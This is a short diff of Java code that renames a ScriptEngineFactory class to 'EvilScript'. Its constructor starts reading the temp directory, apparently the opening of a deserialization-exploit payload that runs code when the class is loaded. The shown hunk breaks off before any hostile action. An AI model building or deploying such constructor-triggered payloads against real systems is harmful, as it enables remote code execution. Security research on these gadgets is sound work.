@@ -8,12 +8,9 @@ import java.util.List;
 import javax.script.ScriptEngine;
 import javax.script.ScriptEngineFactory;
 
-/**
- * @author threedr3am
- */
-public class Threedr3amScript implements ScriptEngineFactory {
+public class EvilScript implements ScriptEngineFactory {
 
-  public Threedr3amScript() throws Throwable {
+  public EvilScript() throws Throwable {
     StringBuilder stringBuilder = new StringBuilder();
     try {
       String tmp = System.getProperty("java.io.tmpdir");
